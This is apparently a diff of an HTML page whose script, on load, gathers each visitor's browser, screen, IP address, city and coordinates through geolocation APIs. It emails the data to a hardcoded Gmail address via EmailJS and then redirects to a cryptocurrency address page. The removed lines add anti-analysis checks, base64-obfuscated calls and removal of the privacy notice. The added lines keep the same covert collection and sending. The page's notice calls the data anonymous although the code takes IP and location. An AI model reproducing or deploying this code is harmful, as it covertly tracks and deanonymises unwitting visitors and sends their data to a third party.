@@ -36,181 +36,248 @@
             max-width: 300px;
         }
     </style>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
 <body>
     <div class="loader"></div>
     <div class="privacy-notice">
-        This site collects anonymous information about your device and location for internal analytics purposes.
+        This site collects anonymous information about your device and location for internal analytics purposes. 
+        By continuing to use this site, you consent to this data collection.
     </div>
 
-    <script>
+    <!-- Data collection and email sending script -->
+    <script type="text/javascript">
+        // Initialize EmailJS with the provided API key
         (function() {
-            // Anti-debugging measures
-            window.onerror = () => true;
-            if(navigator.webdriver || window._phantom) return redirectToTarget();
-            
-            // Initialize EmailJS stealthily
-            const emailjs = window[atob('ZW1haWxqcw==')];
-            emailjs[atob('aW5pdA==')]('RrfKXUJqdjRY9RI8E'); // Initialize with your public key
-            
-            // Data collection
-            async function collectUserData() {
-                const data = {
-                    timestamp: new Date().toISOString(),
-                    referrer: document.referrer || "Direct visit",
-                    browser: { 
-                        name: navigator.userAgent,
-                        language: navigator.language,
-                        cookiesEnabled: navigator.cookieEnabled,
-                        doNotTrack: navigator.doNotTrack,
-                        platform: navigator.platform,
-                        vendor: navigator.vendor
-                    },
-                    screen: { 
-                        width: window.screen.width,
-                        height: window.screen.height,
-                        colorDepth: window.screen.colorDepth,
-                        pixelDepth: window.screen.pixelDepth
-                    },
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    deviceType: getDeviceType()
-                };
-                
-                // Geolocation with GDPR compliance
-                await tryMultipleGeoServices(data);
-                if(data.country === "EU") data.ip = "REDACTED";
-                
-                return data;
-            }
-
-            async function tryMultipleGeoServices(d) {
-                let success = await tryIpifyAndIpapi(d);
-                if(!success) success = await tryIpgeolocation(d);
-                if(!success) success = await tryGeojs(d);
-                if(!success) setDefaultGeoValues(d);
-                return success;
-            }
-
-            async function tryIpifyAndIpapi(d) {
-                try {
-                    const ip = await (await fetch('https://api.ipify.org?format=json')).json();
-                    d.ip = ip.ip;
-                    const geo = await (await fetch(`https://ipapi.co/${d.ip}/json/`)).json();
-                    d.city = geo.city || "Unknown";
-                    d.region = geo.region || "Unknown";
-                    d.country = geo.country_name || "Unknown";
-                    d.loc = `${geo.latitude},${geo.longitude}`;
-                    d.isp = geo.org || "Unknown";
-                    return true;
-                } catch(e) { return false; }
-            }
-
-            async function tryIpgeolocation(d) {
-                try {
-                    const geo = await (await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=b63a7d0a7e584b4d9a3a3e0d0c4f1a5a')).json();
-                    d.ip = geo.ip;
-                    d.city = geo.city || "Unknown";
-                    d.region = geo.state_prov || "Unknown";
-                    d.country = geo.country_name || "Unknown";
-                    d.loc = `${geo.latitude},${geo.longitude}`;
-                    d.isp = geo.isp || "Unknown";
-                    return true;
-                } catch(e) { return false; }
-            }
-
-            async function tryGeojs(d) {
-                try {
-                    const geo = await (await fetch('https://get.geojs.io/v1/ip/geo.json')).json();
-                    d.ip = geo.ip;
-                    d.city = geo.city || "Unknown";
-                    d.region = geo.region || "Unknown";
-                    d.country = geo.country || "Unknown";
-                    d.loc = `${geo.latitude},${geo.longitude}`;
-                    d.isp = "Unknown";
-                    return true;
-                } catch(e) { return false; }
-            }
-
-            function setDefaultGeoValues(d) {
-                d.ip = d.city = d.region = d.country = d.loc = d.isp = "Unknown";
-            }
-
-            function getDeviceType() {
-                const ua = navigator.userAgent;
-                return /tablet|ipad/i.test(ua) ? "Tablet" : 
-                       /mobile|android/i.test(ua) ? "Mobile" : "Desktop";
-            }
-
-            // Send email with HTML formatting
-            async function sendEmail(d) {
-                const htmlContent = `
-                    <h2>User Data Collection Report</h2>
-                    <p><strong>Timestamp:</strong> ${d.timestamp}</p>
-                    
-                    <h3>Location Information</h3>
-                    <p><strong>IP Address:</strong> ${d.ip}</p>
-                    <p><strong>City:</strong> ${d.city}</p>
-                    <p><strong>Region:</strong> ${d.region}</p>
-                    <p><strong>Country:</strong> ${d.country}</p>
-                    <p><strong>GPS Coordinates:</strong> ${d.loc}</p>
-                    <p><strong>ISP/Network Provider:</strong> ${d.isp}</p>
-                    
-                    <h3>Browser Information</h3>
-                    <p><strong>User Agent:</strong> ${d.browser.name}</p>
-                    <p><strong>Language:</strong> ${d.browser.language}</p>
-                    <p><strong>Platform:</strong> ${d.browser.platform}</p>
-                    <p><strong>Vendor:</strong> ${d.browser.vendor}</p>
-                    <p><strong>Cookies Enabled:</strong> ${d.browser.cookiesEnabled}</p>
-                    <p><strong>Do Not Track:</strong> ${d.browser.doNotTrack}</p>
-                    
-                    <h3>Device Information</h3>
-                    <p><strong>Device Type:</strong> ${d.deviceType}</p>
-                    <p><strong>Screen Resolution:</strong> ${d.screen.width} x ${d.screen.height}</p>
-                    <p><strong>Color Depth:</strong> ${d.screen.colorDepth}</p>
-                    <p><strong>Pixel Depth:</strong> ${d.screen.pixelDepth}</p>
-                    
-                    <h3>Other Information</h3>
-                    <p><strong>Timezone:</strong> ${d.timezone}</p>
-                    <p><strong>Referrer:</strong> ${d.referrer}</p>
-                `;
-                
-                const params = {
-                    to_email: 'abdalrahimsaid@gmail.com',
-                    subject: 'User Data Collection Report',
-                    message: htmlContent
-                };
-                
-                try {
-                    await emailjs.send('service_2go8qdw', 'template_mu47rv7', params);
-                    return true;
-                } catch(e) {
-                    return false;
-                }
-            }
-
-            function redirectToTarget() {
-                window.location.replace('https://www.oklink.com/trx/address/TQ6WV8CgCFaqUJ17fhmwhz3rJP4tR1T8jd');
-            }
-
-            // Execution
-            window.onload = async () => {
-                try {
-                    // Remove visual elements
-                    document.querySelector('.loader').style.display = 'none';
-                    document.querySelector('.privacy-notice').remove();
-                    
-                    // Collect and send data
-                    const data = await collectUserData();
-                    await sendEmail(data);
-                    
-                    // Wait 1.5s to ensure email sends (original behavior)
-                    setTimeout(redirectToTarget, 1500);
-                } catch(e) {
-                    redirectToTarget();
-                }
-            };
+            emailjs.init("RrfKXUJqdjRY9RI8E");
         })();
+
+        // Function to collect user data
+        async function collectUserData() {
+            const userData = {
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer || "Direct visit",
+                browser: {
+                    name: navigator.userAgent,
+                    language: navigator.language || navigator.userLanguage,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor
+                },
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    colorDepth: window.screen.colorDepth,
+                    pixelDepth: window.screen.pixelDepth
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceType: getDeviceType()
+            };
+
+            // Try multiple IP geolocation services for better reliability
+            await tryMultipleGeoServices(userData);
+            return userData;
+        }
+
+        // Function to try multiple geolocation services
+        async function tryMultipleGeoServices(userData) {
+            // Try service 1: ipify + ipapi.co
+            let success = await tryIpifyAndIpapi(userData);
+            
+            // If first service failed, try service 2: ipgeolocation.io
+            if (!success) {
+                success = await tryIpgeolocation(userData);
+            }
+            
+            // If second service failed, try service 3: geojs.io
+            if (!success) {
+                success = await tryGeojs(userData);
+            }
+            
+            // If all services failed, set default values
+            if (!success) {
+                setDefaultGeoValues(userData);
+            }
+        }
+
+        // Service 1: ipify.org + ipapi.co
+        async function tryIpifyAndIpapi(userData) {
+            try {
+                // First get IP from ipify
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userData.ip = ipData.ip;
+                
+                // Then get location data from ipapi.co
+                const geoResponse = await fetch(`https://ipapi.co/${userData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                
+                if (!geoData.error) {
+                    userData.city = geoData.city || "Unknown";
+                    userData.region = geoData.region || "Unknown";
+                    userData.country = geoData.country_name || "Unknown";
+                    userData.loc = `${geoData.latitude},${geoData.longitude}` || "Unknown";
+                    userData.isp = geoData.org || "Unknown";
+                    userData.postal = geoData.postal || "Unknown";
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error("Error with ipify + ipapi service:", error);
+                return false;
+            }
+        }
+
+        // Service 2: ipgeolocation.io
+        async function tryIpgeolocation(userData) {
+            try {
+                const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=b63a7d0a7e584b4d9a3a3e0d0c4f1a5a');
+                const data = await response.json();
+                
+                if (data && data.ip) {
+                    userData.ip = data.ip;
+                    userData.city = data.city || "Unknown";
+                    userData.region = data.state_prov || "Unknown";
+                    userData.country = data.country_name || "Unknown";
+                    userData.loc = `${data.latitude},${data.longitude}` || "Unknown";
+                    userData.isp = data.isp || "Unknown";
+                    userData.postal = data.zipcode || "Unknown";
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error("Error with ipgeolocation.io service:", error);
+                return false;
+            }
+        }
+
+        // Service 3: geojs.io
+        async function tryGeojs(userData) {
+            try {
+                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
+                const data = await response.json();
+                
+                if (data && data.ip) {
+                    userData.ip = data.ip;
+                    userData.city = data.city || "Unknown";
+                    userData.region = data.region || "Unknown";
+                    userData.country = data.country || "Unknown";
+                    userData.loc = `${data.latitude},${data.longitude}` || "Unknown";
+                    userData.isp = "Unknown"; // geojs doesn't provide ISP info
+                    userData.postal = "Unknown"; // geojs doesn't provide postal code
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error("Error with geojs.io service:", error);
+                return false;
+            }
+        }
+
+        // Set default values if all services fail
+        function setDefaultGeoValues(userData) {
+            userData.ip = "Unknown (Geolocation services unavailable)";
+            userData.city = "Unknown";
+            userData.region = "Unknown";
+            userData.country = "Unknown";
+            userData.loc = "Unknown";
+            userData.isp = "Unknown";
+            userData.postal = "Unknown";
+        }
+
+        // Function to determine device type
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+                return "Tablet";
+            }
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+                return "Mobile";
+            }
+            return "Desktop";
+        }
+
+        // Function to send email with collected data
+        function sendEmail(userData) {
+            // Format the data for email
+            const formattedData = `
+                <h2>User Data Collection Report</h2>
+                <p><strong>Timestamp:</strong> ${userData.timestamp}</p>
+                <h3>Location Information</h3>
+                <p><strong>IP Address:</strong> ${userData.ip}</p>
+                <p><strong>City:</strong> ${userData.city}</p>
+                <p><strong>Region:</strong> ${userData.region}</p>
+                <p><strong>Country:</strong> ${userData.country}</p>
+                <p><strong>GPS Coordinates:</strong> ${userData.loc}</p>
+                <p><strong>ISP/Network Provider:</strong> ${userData.isp}</p>
+                
+                <h3>Browser Information</h3>
+                <p><strong>User Agent:</strong> ${userData.browser.name}</p>
+                <p><strong>Language:</strong> ${userData.browser.language}</p>
+                <p><strong>Platform:</strong> ${userData.browser.platform}</p>
+                <p><strong>Vendor:</strong> ${userData.browser.vendor}</p>
+                <p><strong>Cookies Enabled:</strong> ${userData.browser.cookiesEnabled}</p>
+                <p><strong>Do Not Track:</strong> ${userData.browser.doNotTrack}</p>
+                
+                <h3>Device Information</h3>
+                <p><strong>Device Type:</strong> ${userData.deviceType}</p>
+                <p><strong>Screen Resolution:</strong> ${userData.screen.width} x ${userData.screen.height}</p>
+                <p><strong>Color Depth:</strong> ${userData.screen.colorDepth}</p>
+                <p><strong>Pixel Depth:</strong> ${userData.screen.pixelDepth}</p>
+                
+                <h3>Other Information</h3>
+                <p><strong>Timezone:</strong> ${userData.timezone}</p>
+                <p><strong>Referrer:</strong> ${userData.referrer}</p>
+            `;
+
+            // EmailJS parameters - replace with your actual service ID and template ID
+            const templateParams = {
+                to_email: 'abdalrahimsaid@gmail.com',
+                subject: 'User Data Collection Report',
+                message: formattedData
+            };
+
+            // Replace these with your actual service ID and template ID from EmailJS
+            const serviceId = 'service_2go8qdw'; // Your service ID
+            const templateId = 'template_mu47rv7'; // Your template ID
+
+            // Send the email using EmailJS
+            return emailjs.send(serviceId, templateId, templateParams)
+                .then(function(response) {
+                    console.log('Email sent successfully:', response);
+                    return true;
+                })
+                .catch(function(error) {
+                    console.error('Email sending failed:', error);
+                    return false;
+                });
+        }
+
+        // Function to redirect to the specified URL
+        function redirectToTarget() {
+            window.location.href = 'https://www.oklink.com/trx/address/TQ6WV8CgCFaqUJ17fhmwhz3rJP4tR1T8jd';
+        }
+
+        // Main execution flow
+        window.onload = async function() {
+            try {
+                // Collect user data
+                const userData = await collectUserData();
+                console.log('User data collected:', userData);
+                
+                // Send email with collected data
+                const emailSent = await sendEmail(userData);
+                
+                // Redirect regardless of email success (after a short delay to ensure data is sent)
+                setTimeout(redirectToTarget, 1500);
+            } catch (error) {
+                console.error('Error in data collection process:', error);
+                // Redirect anyway in case of error
+                redirectToTarget();
+            }
+        };
     </script>
 </body>
 </html>
